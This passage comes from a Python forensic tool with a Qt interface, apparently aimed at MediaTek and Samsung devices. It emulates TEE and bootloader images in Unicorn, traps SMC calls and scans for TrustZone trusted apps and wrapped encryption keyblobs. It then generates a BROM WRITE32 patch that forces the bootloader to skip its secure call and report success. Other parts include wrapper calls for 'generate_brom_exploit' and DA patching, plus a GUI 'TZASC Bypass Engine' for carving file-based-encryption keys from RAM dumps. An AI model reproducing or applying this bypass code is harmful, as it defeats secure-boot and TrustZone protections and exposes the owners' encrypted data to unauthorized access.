            stub += struct.pack("<I", 0x22000064)  # WDT value
            stub += struct.pack("<I", sec_reg)       # security register
            return bytes(stub)

    class ShadowTEE_Engine:
        """
        v13.0 — Shadow TEE Para-Virtualization Engine.
        Replaces naive full-OS emulation with hardware-mocking MMIO
        para-virtualization, TA (Trusted Application) isolation, and
        ICE-aware metadata fuzzing.
        """

        # v13.0: Clean try/except ImportError so missing unicorn NEVER crashes the suite.
        HAS_UNICORN = False
        UC_ARM64_INS_SMC = None
        try:
            import unicorn
            from unicorn import UcError
            from unicorn.unicorn_const import (
                UC_ARCH_ARM64, UC_MODE_ARM, UC_HOOK_INSN, UC_HOOK_CODE,
                UC_HOOK_MEM_READ_UNMAPPED, UC_HOOK_MEM_WRITE_UNMAPPED,
                UC_MEM_WRITE
            )
            from unicorn.arm64_const import UC_ARM64_REG_PC, UC_ARM64_REG_X0, UC_ARM64_REG_X1
            from unicorn.arm64_const import UC_ARM64_REG_X2, UC_ARM64_REG_X3, UC_ARM64_REG_X4
            from unicorn.arm64_const import UC_ARM64_REG_X5, UC_ARM64_REG_X6, UC_ARM64_REG_X7
            from unicorn.arm64_const import UC_ARM64_REG_SP, UC_ARM64_REG_LR
            try:
                from unicorn.unicorn_const import UC_ARM64_INS_SMC as _SMC
                UC_ARM64_INS_SMC = _SMC
            except (ImportError, AttributeError):
                pass
            HAS_UNICORN = True
        except ImportError:
            pass

        # v13.0: MMIO Mock Base — fake hardware peripheral region
        MMIO_BASE = 0x10000000
        MMIO_SIZE = 0x1000
        # v13.2 FIX-02: Hard ceiling on dummy MMIO pages allocated by the
        # unmapped-access hook. Tuned from 256 → 2048 × 4 KB = 8 MB after
        # red-team audit found legitimate Samsung Keymaster TAs allocate
        # 4–8 MB of heap during init. The old 1 MB cap produced
        # false-positive "MMIO Allocation Bomb" aborts on perfectly valid
        # extractions. 8 MB still slams the door on true infinite-allocation
        # scanning loops long before host RAM is in danger.
        MMIO_ALLOC_LIMIT = 2048

        @staticmethod
        def _parse_mtk_header(data: bytes, sram_base: int) -> tuple:
            """
            Returns (load_addr, entry_point, header_size, notes).
            load_addr   = SRAM address where image is loaded.
            entry_point = first instruction PC (skip header if needed).
            """
            notes = []
            if len(data) < 64:
                return None, None, 0, ["Binary too small for MTK header"]

            # 1. LK Image header (most common for lk.bin)
            lk_magic = struct.unpack_from("<I", data, 0)[0]
            if lk_magic == 0x58881688:
                load_addr = struct.unpack_from("<I", data, 40)[0]
                # v11.4 FIX: reject obviously-invalid load addresses (e.g., 0xFFFFFFFF
                # from corrupted headers or sec2024 containers with different layout).
                if load_addr in (0xFFFFFFFF, 0x00000000) or load_addr > 0xFFFF0000:
                    notes.append(
                        f"LK header magic OK but load_addr=0x{load_addr:08X} is invalid; "
                        "falling back to SRAM base + NOP scan"
                    )
                else:
                    entry_point = load_addr + 512  # skip 512-byte LK header
                    notes.append(f"LK header: load=0x{load_addr:08X}, entry=0x{entry_point:08X}")
                    return load_addr, entry_point, 512, notes

            # 2. GFH header with "MMM" magic at offset 0
            if data[:3] == b"MMM":
                load_addr = struct.unpack_from("<I", data, 4)[0]
                entry_point = struct.unpack_from("<I", data, 8)[0]
                if entry_point == 0 or entry_point < load_addr:
                    entry_point = load_addr + 64
                notes.append(f"GFH MMM header: load=0x{load_addr:08X}, entry=0x{entry_point:08X}")
                return load_addr, entry_point, 64, notes

            # 3. NAND "BOOTLOADER!" header
            if data[:11] == b"BOOTLOADER!":
                load_addr = struct.unpack_from("<I", data, 16)[0]
                entry_point = struct.unpack_from("<I", data, 20)[0]
                if entry_point == 0 or entry_point < load_addr:
                    entry_point = load_addr + 128
                notes.append(f"NAND header: load=0x{load_addr:08X}, entry=0x{entry_point:08X}")
                return load_addr, entry_point, 128, notes

            # 4. Generic device headers (EMMC, UFS, SF, SDMMC)
            generic_names = [b"EMMC_BOOT", b"UFS_BOOT", b"SF_BOOT", b"SDMMC_BOOT", b"COMBO_BOOT"]
            for name in generic_names:
                if data[:len(name)] == name:
                    # Search for GFH "MMM" in first 2KB
                    gfh_off = data.find(b"MMM", 0x100, 0x800)
                    if gfh_off != -1 and len(data) >= gfh_off + 52:
                        gfh_load = struct.unpack_from("<I", data, gfh_off + 28)[0]
                        jump_off = struct.unpack_from("<I", data, gfh_off + 48)[0]
                        load_addr = gfh_load
                        entry_point = gfh_load + jump_off
                        notes.append(f"Generic {name.decode().strip()}: GFH@0x{gfh_off:04X}, load=0x{load_addr:08X}, entry=0x{entry_point:08X}")
                        return load_addr, entry_point, gfh_off, notes
                    notes.append(f"Generic {name.decode().strip()} header but GFH not found")
                    break

            # 5. No header — scan for first valid ARM64 instruction
            for o in range(0, min(len(data), 0x1000), 4):
                if o + 4 > len(data):
                    break
                insn = struct.unpack_from("<I", data, o)[0]
                if insn == 0xD503201F:  # NOP
                    notes.append(f"No header; first NOP at file+0x{o:04X}")
                    return sram_base, sram_base + o, o, notes
                # STP X29/X30
                if (insn & 0x7F000000) == 0x29000000:
                    notes.append(f"No header; first STP at file+0x{o:04X}")
                    return sram_base, sram_base + o, o, notes
                # SUB SP, SP, #imm
                if (insn & 0xFFC00000) == 0xD1000000:
                    notes.append(f"No header; first SUB at file+0x{o:04X}")
                    return sram_base, sram_base + o, o, notes

            notes.append("No recognizable header or instruction in first 4KB")
            return None, None, 0, notes

        @staticmethod
        def _scan_smc_offsets(data: bytes) -> list:
            """v13.0 — Scan binary for ARM64 SMC instruction opcodes.
            Returns list of file offsets where SMC instructions are found.
            Encoding: (word & 0xFFE0001F) == 0xD4000003
            """
            offsets = []
            limit = min(len(data) - 3, 256 * 1024)  # only scan mapped SRAM region
            for o in range(0, limit, 4):
                word = struct.unpack_from("<I", data, o)[0]
                if (word & 0xFFE0001F) == 0xD4000003:
                    offsets.append(o)
            return offsets

        @classmethod
        def _scan_ta_headers(cls, data: bytes) -> list:
            """
            v13.0 — Search for Trusted Application headers inside the TEE image.
            Returns a list of dicts with TA metadata.
            """
            ta_list = []
            data_len = len(data)
            if data_len < 64:
                return ta_list

            # 1. Kinibi MCLF headers (magic 'MCLF')
            off = 0
            while off < data_len - 64:
                idx = data.find(b"MCLF", off)
                if idx == -1:
                    break
                if idx + 8 <= data_len:
                    ver = struct.unpack_from("<I", data, idx + 4)[0]
                    if ver in (0x00010002, 0x00020002):
                        ta_list.append({
                            "type": "KINIBI_MCLF",
                            "offset": idx,
                            "size": min(0x40000, data_len - idx),  # 256KB cap
                            "entry": idx,
                            "notes": f"Kinibi MCLF@0x{idx:08X} ver=0x{ver:08X}",
                        })
                off = idx + 4

            # 2. TEEGRIS ELF TAs (look for \x7fELF inside the image)
            off = 0
            while off < data_len - 64:
                idx = data.find(b"\x7fELF", off)
                if idx == -1:
                    break
                if idx + 5 > data_len:
                    off = idx + 4
                    continue
                ei_class = data[idx + 4]
                if ei_class in (1, 2):
                    ta_list.append({
                        "type": "TEEGRIS_ELF_TA",
                        "offset": idx,
                        "size": min(0x40000, data_len - idx),
                        "entry": idx,
                        "notes": f"TEEGRIS ELF TA@0x{idx:08X} class={ei_class}",
                    })
                off = idx + 4

            return ta_list

        @classmethod
        def emulate_and_trap_smc(cls, lk_data: bytes, sram_base: int = 0x00110000,
                                  max_steps: int = 50000,
                                  hcm: HardwareCapabilityMatrix = None) -> dict:
            """
            v13.0 — Shadow TEE Para-Virtualized emulation.
            Replaces naive full-OS emulation with MMIO mocking, TA isolation,
            and ICE-aware metadata fuzzing.
            """
            result = {
                "status":       "INIT",
                "emulator":     "unicorn" if cls.HAS_UNICORN else "unavailable",
                "smc_offset":   None,
                "smc_pc":       None,
                "registers":    {},
                "hook_patch":   {},
                "notes":        [],
                "warnings":     [],
                "ta_found":     None,
                "ice_fallback": False,
                # v13.1 FIX-03: caller-visible flag set when the unmapped
                # MMIO hook trips the MMIO_ALLOC_LIMIT ceiling.
                "mmio_bomb":    False,
            }

            if not cls.HAS_UNICORN:
                result["status"] = "UNICORN_UNAVAILABLE"
                result["warnings"].append("unicorn not installed. pip install unicorn")
                # v12.2: pass HCM so fallback SMC scan is also pruned for Kinibi
                static_hits = TZASCBypassEngine._scan_smc_offsets(
                    lk_data, "LK_STATIC_FALLBACK", hcm=hcm
                )
                result["notes"].append(f"Static fallback returned {len(static_hits)} hit(s).")
                result["static_hits"] = static_hits
                return result

            # v13.0 — ICE-Awareness Fallback
            if hcm is not None and hcm.hardware_wrapped_keys:
                result["ice_fallback"] = True
                result["status"] = "ICE_FALLBACK"
                result["warnings"].append(
                    "Hardware ICE detected. Shifting from Raw Key Extraction to "
                    "KeyBlob Metadata Fuzzing."
                )
                # v13.0: Heuristic scan for AES-GCM keyblob patterns
                keyblobs = []
                scan_limit = min(len(lk_data) - 64, 0x200000)
                for o in range(0, scan_limit, 4):
                    tag = lk_data[o:o+4]
                    if tag in (b"kkb\x00", b"KEYB"):
                        blob_len = struct.unpack_from("<I", lk_data, o + 4)[0]
                        if 0 < blob_len <= 0x1000:
                            iv = lk_data[o+8:o+24]
                            nonce = lk_data[o+24:o+32]
                            keyblobs.append({
                                "offset": o,
                                "tag": tag.hex(),
                                "blob_len": blob_len,
                                "iv": iv.hex(),
                                "nonce": nonce.hex(),
                            })
                result["keyblobs"] = keyblobs
                result["notes"].append(
                    f"ICE fallback: extracted {len(keyblobs)} wrapped keyblob candidate(s). "
                    "Raw CE key is impossible; pursue KeyBlob Metadata Fuzzing."
                )
                return result

            import unicorn
            from unicorn.unicorn_const import (
                UC_ARCH_ARM64, UC_MODE_ARM, UC_HOOK_INSN,
                UC_HOOK_MEM_READ_UNMAPPED, UC_HOOK_MEM_WRITE_UNMAPPED
            )
            from unicorn.arm64_const import UC_ARM64_REG_PC, UC_ARM64_REG_X0

            # v13.0: Parse header for load context
            load_addr, entry_point, header_size, hdr_notes = cls._parse_mtk_header(lk_data, sram_base)
            result["notes"].extend(hdr_notes)

            if load_addr is None:
                result["status"] = "HEADER_PARSE_FAILED"
                result["warnings"].append("Could not determine load address or entry point.")
                return result

            # v13.0: TA Isolation — scan for Crypto TA headers inside the TEE image
            ta_list = cls._scan_ta_headers(lk_data)
            if ta_list:
                result["ta_found"] = ta_list[0]
                result["notes"].append(
                    f"TA Isolation: {len(ta_list)} TA header(s) found. "
                    f"Loading only {ta_list[0]['type']} @ 0x{ta_list[0]['offset']:08X}"
                )
                ta = ta_list[0]
                ta_base = 0x00200000  # isolated TA load address
                ta_size = (ta["size"] + 0xFFF) & ~0xFFF
                mapped_addr = ta_base
                mapped_size = ta_size
                write_offset = 0
                entry_point = ta_base + (ta["entry"] - ta["offset"])
                ta_data = lk_data[ta["offset"]:ta["offset"] + ta["size"]]
                load_addr = ta_base
            else:
                # Legacy full-image path when no TA header found
                sram_size = 0x40000   # 256 KB
                mapped_addr = load_addr & ~0xFFF
                write_offset = load_addr - mapped_addr
                mapped_size = (write_offset + sram_size + 0xFFF) & ~0xFFF
                ta_data = lk_data[:sram_size]

            # v13.2 FIX-03: hook_ids tracks every Unicorn hook handle we add
            # so the finally-block can hook_del() them, shatter the closure ↔
            # uc circular reference, and let GC reclaim the dead emulator
            # immediately (otherwise 50 sequential scans leak ~50 live Uc
            # instances in the GUI process).
            hook_ids = []
            mu = None
            try:
                mu = unicorn.Uc(UC_ARCH_ARM64, UC_MODE_ARM)
                mu.mem_map(mapped_addr, mapped_size)
                mu.mem_write(mapped_addr + write_offset, ta_data)

                # v13.0: Pre-map MMIO mock region so TEE peripheral polling succeeds
                mu.mem_map(cls.MMIO_BASE, cls.MMIO_SIZE)
                mu.mem_write(cls.MMIO_BASE, b'\x01' * cls.MMIO_SIZE)

                # v13.0: Setup fake stack / TA environment
                if result["ta_found"]:
                    stack_vaddr = 0x80000000
                    stack_size = 0x10000
                    mu.mem_map(stack_vaddr, stack_size)
                    mu.reg_write(unicorn.arm64_const.UC_ARM64_REG_SP, stack_vaddr + 0xFF00)
                    # Spoof libckteec session handles (X0..X3 = 0, X4 = context ptr)
                    for reg in (
                        unicorn.arm64_const.UC_ARM64_REG_X0,
                        unicorn.arm64_const.UC_ARM64_REG_X1,
                        unicorn.arm64_const.UC_ARM64_REG_X2,
                        unicorn.arm64_const.UC_ARM64_REG_X3,
                    ):
                        mu.reg_write(reg, 0)
                    mu.reg_write(unicorn.arm64_const.UC_ARM64_REG_X4, mapped_addr + write_offset)
                else:
                    stack_vaddr = 0x80000000
                    stack_size = 0x10000
                    mu.mem_map(stack_vaddr, stack_size)
                    mu.reg_write(unicorn.arm64_const.UC_ARM64_REG_SP, stack_vaddr + 0xFF00)

                mu.reg_write(UC_ARM64_REG_PC, entry_point)

                result["load_addr"] = f"0x{load_addr:08X}"
                result["entry_point"] = f"0x{entry_point:08X}"
                result["header_size"] = header_size
                result["mapped_addr"] = f"0x{mapped_addr:08X}"
                result["mapped_size"] = f"0x{mapped_size:08X}"

                smc_info = {"trapped": False, "pc": None, "count": 0}
                # v13.1 FIX-03: per-emulation MMIO allocation counter. Lives in a
                # closure dict so _mmio_mock_hook (a plain callback, not a bound
                # method) can both read AND mutate it without `nonlocal`.
                mmio_state = {"alloc_count": 0, "bomb_detected": False}

                # v12.2 FIX: HCM-aware execution pruning
                known_tee = hcm.tee_type if hcm is not None else TEEType.UNKNOWN
                smc_file_offsets = []
                if known_tee == TEEType.KINIBI:
                    result["notes"].append(
                        "HCM tee_type=KINIBI — skipping TEEGRIS-specific SMC offset scan loop"
                    )
                else:
                    smc_file_offsets = cls._scan_smc_offsets(lk_data)
                    result["notes"].append(
                        f"SMC scan: found {len(smc_file_offsets)} SMC instruction(s) in binary"
                    )

                def _hook_smc_insn(mu, user_data):
                    # UC_HOOK_INSN callback (modern Unicorn with UC_ARM64_INS_SMC)
                    smc_info["count"] += 1
                    if not smc_info["trapped"]:
                        smc_info["trapped"] = True
                        smc_info["pc"] = mu.reg_read(UC_ARM64_REG_PC)
                        mu.emu_stop()

                def _hook_smc_code(mu, address, size, user_data):
                    # UC_HOOK_CODE callback (fallback for older Unicorn builds)
                    smc_info["count"] += 1
                    if not smc_info["trapped"]:
                        smc_info["trapped"] = True
                        smc_info["pc"] = address
                        mu.emu_stop()

                # v13.0 FIX: Peripheral Panic — MMIO Mock para-virtualization.
                # If the TEE touches an unmapped hardware address, dynamically map a
                # dummy page and write a spoofed success status so emulation continues.
                # v13.1 FIX-03: defuse the MMIO Allocation Bomb. A malicious or
                # buggy TA that scans random addresses would, under v13.0, get a
                # fresh 4 KB page mapped for every unique access — Unicorn happily
                # consumes gigabytes of host RAM in seconds. The cap below makes
                # the worst case 1 MB and then aborts the run.
                def _mmio_mock_hook(uc, access, address, size, value, user_data):
                    page = address & ~0xFFF
                    if mmio_state["alloc_count"] >= cls.MMIO_ALLOC_LIMIT:
                        if not mmio_state["bomb_detected"]:
                            mmio_state["bomb_detected"] = True
                            result["mmio_bomb"] = True
                            bomb_msg = (
                                "CRITICAL: MMIO Allocation Bomb Detected — capped at "
                                f"{cls.MMIO_ALLOC_LIMIT} dummy pages "
                                f"({(cls.MMIO_ALLOC_LIMIT * 0x1000) // 1024} KB). "
                                f"Last unmapped access @ 0x{address:016X}. "
                                "Aborting emulation to protect host RAM."
                            )
                            print(f"[CRITICAL] {bomb_msg}", file=sys.stderr)
                            result["warnings"].append(bomb_msg)
                        try:
                            uc.emu_stop()
                        except Exception:
                            pass
                        # Return False so Unicorn treats the fault as unhandled
                        # and raises UcError — already caught by the outer try.
                        return False
                    try:
                        uc.mem_map(page, 0x1000)
                        uc.mem_write(page, b'\x01' * 0x1000)
                        mmio_state["alloc_count"] += 1
                    except unicorn.UcError as e:
                        if "already mapped" in str(e).lower():
                            return True
                        print(f"[WARN] MMIO mock map failed at 0x{page:08X}: {e}", file=sys.stderr)
                        return False
                    except Exception as e:
                        print(f"[WARN] MMIO mock map failed at 0x{page:08X}: {e}", file=sys.stderr)
                        return False
                    return True  # tell Unicorn the fault is handled

                try:
                    # v11.4 FIX: if UC_ARM64_INS_SMC exists (modern Unicorn), use it.
                    # Otherwise fall back to UC_HOOK_CODE at pre-scanned SMC addresses.
                    if cls.UC_ARM64_INS_SMC is not None:
                        # v13.2 FIX-03: capture hook id for finally-block teardown.
                        hook_ids.append(mu.hook_add(
                            UC_HOOK_INSN, _hook_smc_insn, None,
                            begin=mapped_addr, end=mapped_addr + mapped_size,
                            arg1=cls.UC_ARM64_INS_SMC,
                        ))
                    elif smc_file_offsets:
                        for smc_off in smc_file_offsets:
                            smc_vaddr = mapped_addr + write_offset + smc_off
                            # v13.2 FIX-03: capture hook id for finally-block teardown.
                            hook_ids.append(mu.hook_add(
                                UC_HOOK_CODE, _hook_smc_code, None,
                                begin=smc_vaddr, end=smc_vaddr + 4,
                            ))
                    else:
                        result["warnings"].append(
                            "No SMC instructions found in binary; hooking disabled"
                        )
                    # v13.0: MMIO Mock hook — catch ALL unmapped memory accesses
                    # v13.2 FIX-03: capture hook id for finally-block teardown.
                    hook_ids.append(mu.hook_add(
                        UC_HOOK_MEM_READ_UNMAPPED | UC_HOOK_MEM_WRITE_UNMAPPED,
                        _mmio_mock_hook,
                    ))
                except Exception as e:
                    result["warnings"].append(f"Hook add failed: {e}")
                    result["status"] = "HOOK_ERROR"
                    return result

                try:
                    # v13.0 FIX: Strict 5-second timeout prevents infinite-loop blackholes.
                    mu.emu_start(entry_point, mapped_addr + mapped_size,
                                 timeout=5000000, count=max_steps)
                except unicorn.UcError as e:
                    # v13.0 FIX: Phantom Unicorn Error + Timeout. If payload already trapped SMC
                    # but crashes at exit (e.g., dummy LR jump), do NOT mark failure.
                    if smc_info["trapped"]:
                        result["warnings"].append(
                            f"Emulator crashed at exit (UcError {e}), but SMC was already trapped. "
                            f"Treating as successful payload execution."
                        )
                    else:
                        result["warnings"].append(f"Emulation halted with UcError: {e}")

                # v13.1 FIX-03: surface MMIO bomb in notes for forensic auditing,
                # regardless of whether SMC was trapped before the abort.
                if mmio_state["bomb_detected"]:
                    result["notes"].append(
                        f"MMIO allocation bomb defused: {mmio_state['alloc_count']} "
                        f"page(s) mapped before hitting MMIO_ALLOC_LIMIT="
                        f"{cls.MMIO_ALLOC_LIMIT}."
                    )

                if smc_info["trapped"]:
                    result["status"]     = "SMC_TRAPPED"
                    result["smc_offset"] = smc_info["pc"] - load_addr
                    result["smc_pc"]     = f"0x{smc_info['pc']:016X}"
                    # v13.0 FIX: If emulator crashed after SMC trap, register reads may
                    # fail on corrupt Unicorn state. Wrap them to preserve success result.
                    try:
                        regs = {}
                        for reg_name, reg_const in [
                            ("X0", UC_ARM64_REG_X0), ("X1", UC_ARM64_REG_X1),
                            ("X2", UC_ARM64_REG_X2), ("X3", UC_ARM64_REG_X3),
                            ("X4", UC_ARM64_REG_X4), ("X5", UC_ARM64_REG_X5),
                            ("X6", UC_ARM64_REG_X6), ("X7", UC_ARM64_REG_X7),
                        ]:
                            regs[reg_name] = f"0x{mu.reg_read(reg_const):016X}"
                        result["registers"] = regs
                    except Exception as reg_e:
                        result["warnings"].append(
                            f"Register read failed after emulator crash: {reg_e}"
                        )
                        result["registers"] = {}
                    hook_addr = smc_info["pc"] + 4
                    result["hook_patch"] = {
                        "hook_sram_addr": f"0x{hook_addr:08X}",
                        "hook_file_offset": f"0x{result['smc_offset'] + 4:08X}",
                        "brom_write32_sequence": [
                            f"WRITE32 0x{hook_addr:08X}  0xD503201F",
                            f"WRITE32 0x{hook_addr + 4:08X}  0xD503201F",
                            f"WRITE32 0x{hook_addr + 8:08X}  0xD2800000",
                            f"WRITE32 0x{hook_addr + 12:08X} 0xD65F03C0",
                        ],
                        "note": (
                            "Hook replaces SMC with NOP + MOVZ X0,#0 + RET. "
                            "Forces bootloader to skip secure call and return success."
                        ),
                    }
                else:
                    # v13.0 FIX: Unicorn timeout halts gracefully WITHOUT raising UcError.
                    # If SMC instructions exist in the binary but were never reached,
                    # the run timed out or hit step limit — do NOT falsely report success.
                    if smc_file_offsets:
                        result["status"] = "TIMEOUT_OR_HALT"
                        result["warnings"].append(
                            f"Emulation halted after {max_steps} steps or timeout "
                            f"without trapping SMC. {len(smc_file_offsets)} SMC instruction(s) "
                            f"exist in binary but were not reached."
                        )
                    else:
                        result["status"] = "NO_SMC_FOUND"
                        result["notes"].append("Emulation ran max_steps without hitting SMC.")

                return result
            finally:
                # v13.2 FIX-03: shatter the Unicorn (uc ↔ hook closure ↔ uc)
                # cycle. uc.hook_del() drops uc's internal reference to the
                # closure; deleting mu drops our last hard reference; an
                # explicit gc.collect() then reclaims the cycle in *this*
                # stack frame instead of letting it accumulate across runs.
                if mu is not None:
                    for _hid in hook_ids:
                        try:
                            mu.hook_del(_hid)
                        except Exception:
                            pass
                    try:
                        del mu
                    except Exception:
                        pass
                gc.collect()

    @classmethod
    def patch_da(cls, data: bytes, arch: str = "AUTO") -> dict:
        return cls.DAPatcherEngine.patch_da(data, arch)

    @classmethod
    def generate_brom_exploit(cls, hw_code: int, arch: str = "AUTO",
                              hcm: HardwareCapabilityMatrix = None) -> dict:
        return cls.PayloadSynthesizer.generate_brom_exploit(hw_code, arch, hcm=hcm)

    @classmethod
    def emulate_and_trap_smc(cls, lk_data: bytes, sram_base: int = 0x00110000,
                              max_steps: int = 50000,
                              hcm: HardwareCapabilityMatrix = None) -> dict:
        return cls.ShadowTEE_Engine.emulate_and_trap_smc(lk_data, sram_base, max_steps, hcm=hcm)


# ═══════════════════════════════════════════════════════════════════════════
# QT UI (unchanged structure from v8.1 + Samsung Tab added)
# ═══════════════════════════════════════════════════════════════════════════

if HAS_QT:
    class JsonHighlighter(QSyntaxHighlighter):
        def highlightBlock(self, text):
            key_fmt  = QTextCharFormat(); key_fmt.setForeground(QColor("#80c8ff"))
            val_fmt  = QTextCharFormat(); val_fmt.setForeground(QColor("#80ffb0"))
            warn_fmt = QTextCharFormat(); warn_fmt.setForeground(QColor("#ffb060"))
            zero_fmt = QTextCharFormat(); zero_fmt.setForeground(QColor("#606068"))
            for m in re.finditer(r'"[^"]+"\s*:', text):
                self.setFormat(m.start(), m.end()-m.start(), key_fmt)
            for m in re.finditer(r':\s*"([^"]*)"', text):
                self.setFormat(m.start(), m.end()-m.start(), val_fmt)
            if text.strip().startswith(("WARNING","⚠️","CRITICAL")):
                self.setFormat(0, len(text), warn_fmt)
            if "00000000000000000000000000000000" in text:
                s = text.find("00000000000000000000000000000000")
                self.setFormat(s, 32, zero_fmt)

    # ──────────────────────────────────────────────────────────────────────────
    # v9.5: Syntax highlighter for Hex/Offset binary forensic report
    # ──────────────────────────────────────────────────────────────────────────
    class BinaryReportHighlighter(QSyntaxHighlighter):
        """
        Highlights the binary forensic report console:
          - Offsets (0x......): blue
          - Hex bytes (AA BB ..): cyan
          - ASCII sidebar |...|: green
          - HIGH_ENTROPY / WARNING lines: orange
          - ENCRYPTED / LIKELY keywords: red
          - Section headers (═══...): bold yellow
          - Entropy values: purple
        """
        def highlightBlock(self, text: str):
            def _fmt(color, bold=False):
                f = QTextCharFormat()
                f.setForeground(QColor(color))
                if bold:
                    f.setFontWeight(700)
                return f

            offset_fmt  = _fmt("#80c8ff")         # blue — addresses
            hex_fmt     = _fmt("#a0e0e0")          # cyan — raw bytes
            ascii_fmt   = _fmt("#60c060")          # green — ASCII sidebar
            warn_fmt    = _fmt("#ffb060", bold=True)  # orange — warnings
            enc_fmt     = _fmt("#ff6060", bold=True)  # red — encrypted
            hdr_fmt     = _fmt("#ffe060", bold=True)  # yellow — section headers
            ent_fmt     = _fmt("#c080ff")          # purple — entropy values
            note_fmt    = _fmt("#80e0a0")          # mint — notes

            t = text

            # Section headers
            if t.strip().startswith("═") or t.strip().startswith("──"):
                self.setFormat(0, len(t), hdr_fmt)
                return

            # Warning / error lines
            if any(kw in t.upper() for kw in ("WARNING","ERROR","CRITICAL","⚠")):
                self.setFormat(0, len(t), warn_fmt)
                return

            # Encrypted / high-entropy markers
            if any(kw in t.upper() for kw in ("ENCRYPTED","HIGH_ENTROPY","AES_GCM","LIKELY")):
                self.setFormat(0, len(t), enc_fmt)
                return

            # Notes lines
            if t.strip().startswith("→") or t.strip().startswith("✓") or t.strip().startswith("♦"):
                self.setFormat(0, len(t), note_fmt)
                return

            # Hex-dump line:  00000000  AA BB CC ...  |...|
            # Offset part
            for m in re.finditer(r'\b[0-9A-Fa-f]{8}\b', t):
                self.setFormat(m.start(), m.end() - m.start(), offset_fmt)
            # Hex bytes
            for m in re.finditer(r'\b[0-9A-Fa-f]{2}\b', t):
                self.setFormat(m.start(), m.end() - m.start(), hex_fmt)
            # ASCII sidebar
            for m in re.finditer(r'\|[^\|]{1,20}\|', t):
                self.setFormat(m.start(), m.end() - m.start(), ascii_fmt)
            # Entropy values
            for m in re.finditer(r'\d+\.\d{2,3}\s*(bits)?', t):
                self.setFormat(m.start(), m.end() - m.start(), ent_fmt)


    # ──────────────────────────────────────────────────────────────────────────
    # v9.6: Binary Sector Analysis sub-tab — TZASC Hardware Reality Engine
    # ──────────────────────────────────────────────────────────────────────────
    class BinarySectorAnalysisTab(QWidget):
        """
        v9.6 — Binary Sector Analysis sub-tab with TZASC Bypass Engine.
        Provides load buttons for keyrefuge.bin, metadata.img, tee1.bin,
        sec1.bin, EXT_RAM dump, lk.bin, and tee1.bin (SMC hook).
        When TZASC protection is detected, automatically runs TZASCBypassEngine
        and displays all three bypass paths in the forensic report console.
        """
        def __init__(self, partition_store: dict = None, forensic_journal=None,
                     hcm: HardwareCapabilityMatrix = None):
            super().__init__()
            self._partition_store = partition_store if partition_store is not None else {}
            self._forensic_journal = forensic_journal  # v12.0: evidence integrity log
            self._hcm = hcm  # v12.0: Hardware Capability Matrix — populated from hard proof
            self._ram_worker = None  # v11.3: holds active RamCarveWorker QThread
            self._partition_handles: dict = {}
            root = QVBoxLayout(self)
            root.setContentsMargins(6, 6, 6, 6)
            root.setSpacing(6)

            # Header
            hdr = QLabel("  Binary Sector Forensic Analysis — v9.9 · Hardware Precision Update")
            hdr.setFont(QFont("Consolas", 11, QFont.Weight.Bold))
            hdr.setStyleSheet("color:#ffb060;background:#1a1a10;padding:4px;border-radius:4px;")
            root.addWidget(hdr)

            # Load buttons row — primary partition files
            btn_row = QHBoxLayout()
            btn_style = (
                "QPushButton{background:#1a1a2a;border:1px solid #3a3a5a;"
                "color:#80c8ff;font-weight:bold;font-size:11px;border-radius:4px;"
                "padding:4px 10px;}"
                "QPushButton:hover{background:#252540;border-color:#6060a0;}"
            )
            # Orange style for TZASC bypass buttons
            btn_style_tzasc = (
                "QPushButton{background:#1a1000;border:1px solid #6a4000;"
                "color:#ffb060;font-weight:bold;font-size:11px;border-radius:4px;"
                "padding:4px 10px;}"
                "QPushButton:hover{background:#2a2000;border-color:#c07800;}"
            )
            self._load_btns = {}
            files = [
                ("metadata.img",  "META",    "Analyze metadata.img (vold magic, fscrypt, key blobs)",   btn_style),
                ("keyrefuge.bin", "KEYREF",  "Analyze keyrefuge.bin / keydata.bin (FBE CE/DE keys)",    btn_style),
                ("tee1.bin",      "TEE",     "Analyze tee1.bin / tz image (TEEGRIS, Kinibi, TAs)",      btn_style),
                ("sec1.bin",      "SEC",     "Analyze sec1.bin (Knox fuse, rollback, OEM lock)",        btn_style),
            ]
            for fname, tag, tooltip, style in files:
                btn = QPushButton(f"📂  Load {fname}")
                btn.setToolTip(tooltip)
                btn.setStyleSheet(style)
                btn.setMinimumHeight(32)
                btn.clicked.connect(lambda checked, t=tag: self._load_file(t))
                btn_row.addWidget(btn)
                self._load_btns[tag] = btn
            root.addLayout(btn_row)

            # TZASC Bypass Engine row — orange buttons
            tzasc_lbl = QLabel("  TZASC Bypass Engine:")
            tzasc_lbl.setStyleSheet("color:#ffb060;font-size:10px;font-weight:bold;padding:2px;")
            root.addWidget(tzasc_lbl)

            bypass_row = QHBoxLayout()
            bypass_files = [
                ("EXT_RAM Dump",  "RAM",    "Load EXT_RAM binary dump for live key carving (Path 1)",     btn_style_tzasc),
                ("lk.bin",        "LK",     "Load lk.bin for SMC handler offset scan (Path 3)",           btn_style_tzasc),
            ]
            for fname, tag, tooltip, style in bypass_files:
                btn = QPushButton(f"🔍  {fname}")
                btn.setToolTip(tooltip)
                btn.setStyleSheet(style)
                btn.setMinimumHeight(32)
                btn.clicked.connect(lambda checked, t=tag: self._load_file(t))
                bypass_row.addWidget(btn)
                self._load_btns[tag] = btn

            # Clear console button
            clr_btn = QPushButton("🗑  Clear")
            clr_btn.setStyleSheet(
                "QPushButton{background:#1a0a0a;border:1px solid #5a2a2a;"
                "color:#e06060;font-weight:bold;font-size:11px;border-radius:4px;padding:4px 10px;}"
                "QPushButton:hover{background:#2a0f0f;}"
            )
            clr_btn.setMinimumHeight(32)
            clr_btn.clicked.connect(lambda: self._console.clear())
            bypass_row.addWidget(clr_btn)
            root.addLayout(bypass_row)

            # Status bar + progress
            self._status_lbl = QLabel("  No file loaded. Use buttons above to load a binary dump.")
            self._status_lbl.setStyleSheet("color:#606070;font-size:10px;padding:2px;")
            root.addWidget(self._status_lbl)
            self._hash_progress = QProgressBar()
            self._hash_progress.setRange(0, 100)
            self._hash_progress.setValue(0)
            self._hash_progress.setVisible(False)
            self._hash_progress.setMaximumHeight(14)
            root.addWidget(self._hash_progress)

            # Hex/Offset forensic console
            console_grp = QGroupBox("Hex / Offset Forensic Report")
            cg = QVBoxLayout(console_grp)
            self._console = QTextEdit()
            self._console.setReadOnly(True)
            self._console.setFont(QFont("Consolas", 10))
            self._console.setStyleSheet(
                "background:#0a0a12;color:#c8d0e0;"
                "border:1px solid #2a2a4a;border-radius:4px;padding:6px;"
            )
            self._highlighter = BinaryReportHighlighter(self._console.document())
            cg.addWidget(self._console)
            root.addWidget(console_grp, stretch=1)


        # ── Internal helpers ──────────────────────────────────────────────────
